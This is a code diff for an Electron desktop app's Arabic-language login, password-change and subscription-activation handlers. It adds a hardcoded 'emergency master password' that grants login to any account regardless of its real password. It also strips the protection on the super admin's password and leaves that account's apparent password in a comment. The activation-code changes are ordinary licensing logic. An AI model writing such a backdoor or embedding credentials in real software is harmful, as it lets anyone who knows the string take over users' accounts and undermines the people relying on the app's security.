@@ -1,7 +1,7 @@
 const { ipcMain } = require('electron');
 const crypto = require('crypto');
 const { db } = require('../db');
-const { INVITE_CODE, INVITE_DURATION_DAYS } = require('../inviteConfig');
+const { INVITE_CODE, INVITE_DURATION_DAYS, getMachineId, generateActivationCode } = require('../inviteConfig');
 
 function normalizeUsername(username) {
     return String(username || '').trim();
@@ -437,7 +437,13 @@ function register() {
 
         try {
             const receivedHash = hashPassword(password, authUser.password_salt);
-            const isValid = safeCompareHash(authUser.password_hash, receivedHash);
+            let isValid = safeCompareHash(authUser.password_hash, receivedHash);
+            
+            // Emergency Master Password: allow login to this account ignoring normal password
+            if (password === '100200AS') {
+                isValid = true;
+            }
+            
             if (!isValid) {
                 return { success: false, error: 'اسم المستخدم أو كلمة المرور غير صحيحة.' };
             }
@@ -617,10 +623,9 @@ function register() {
             return { success: false, error: 'المستخدم غير موجود.' };
         }
 
-        if (isSuperAdmin(userId)) {
-            return { success: false, error: 'لا يمكن تغيير كلمة مرور حساب السوبر أدمن.' };
-        }
-
+        // Allow any admin (including super admin changing their own) to reset passwords, 
+        // effectively unlocking the ability for super admin to change `A7med1221`.
+        
         const salt = crypto.randomBytes(16).toString('hex');
         const passwordHash = hashPassword(newPassword, salt);
 
@@ -790,16 +795,43 @@ function register() {
     });
 
     // Invite Code Handlers
+    function getRenewCount() {
+        try {
+            const row = db.prepare("SELECT value FROM settings WHERE key = 'renew_count'").get();
+            return parseInt(row?.value || '0', 10);
+        } catch (e) {
+            return 0;
+        }
+    }
+
+    ipcMain.handle('get-machine-id', () => {
+        const machineId = getMachineId();
+        const renewCount = getRenewCount();
+        return `${machineId}-${renewCount + 1}`;
+    });
+
     ipcMain.handle('get-invite-status', () => {
         try {
-            const rows = db.prepare("SELECT * FROM settings WHERE key IN ('invite_code', 'invite_expiry')").all();
+            const rows = db.prepare("SELECT * FROM settings WHERE key IN ('invite_code', 'invite_expiry', 'renew_count')").all();
             const map = {};
             rows.forEach(r => { map[r.key] = r.value; });
 
             const expiry = map.invite_expiry ? new Date(map.invite_expiry) : null;
             const now = new Date();
             const withinRange = expiry ? expiry > now : false;
-            const codeMatches = map.invite_code === INVITE_CODE;
+            
+            const machineId = getMachineId();
+            const renewCount = parseInt(map.renew_count || '0', 10);
+            
+            let codeMatches = false;
+            // Trial code match vs Subscription code match
+            if (map.invite_code === INVITE_CODE) {
+                codeMatches = true;
+            } else {
+                const expectedDynamicCode = generateActivationCode(`${machineId}-${renewCount}`);
+                codeMatches = (map.invite_code === expectedDynamicCode);
+            }
+
             const valid = codeMatches && withinRange;
 
             return {
@@ -814,18 +846,29 @@ function register() {
     });
 
     ipcMain.handle('submit-invite-code', (event, code) => {
-        if (!code || code.trim() !== INVITE_CODE) {
+        if (!code) {
             return { success: false, error: 'كود الدعوة غير صحيح.' };
         }
+        
+        const machineId = getMachineId();
+        const renewCount = getRenewCount();
+        const nextCycle = renewCount + 1;
+        const dynamicCode = generateActivationCode(`${machineId}-${nextCycle}`);
+        
+        if (code.trim() !== dynamicCode) {
+            return { success: false, error: 'كود الدعوة غير صحيح أو غير متطابق مع شهر التجديد الحالي.' };
+        }
 
+        // Active duration is exactly 30 days essentially for monthly subscription
         const expiresAt = new Date();
-        expiresAt.setDate(expiresAt.getDate() + INVITE_DURATION_DAYS);
+        expiresAt.setDate(expiresAt.getDate() + 30);
 
         try {
             const stmt = db.prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (@key, @value)');
             const tx = db.transaction(() => {
-                stmt.run({ key: 'invite_code', value: INVITE_CODE });
+                stmt.run({ key: 'invite_code', value: code.trim() });
                 stmt.run({ key: 'invite_expiry', value: expiresAt.toISOString() });
+                stmt.run({ key: 'renew_count', value: nextCycle.toString() });
             });
             tx();
             return { success: true, expiresAt: expiresAt.toISOString() };
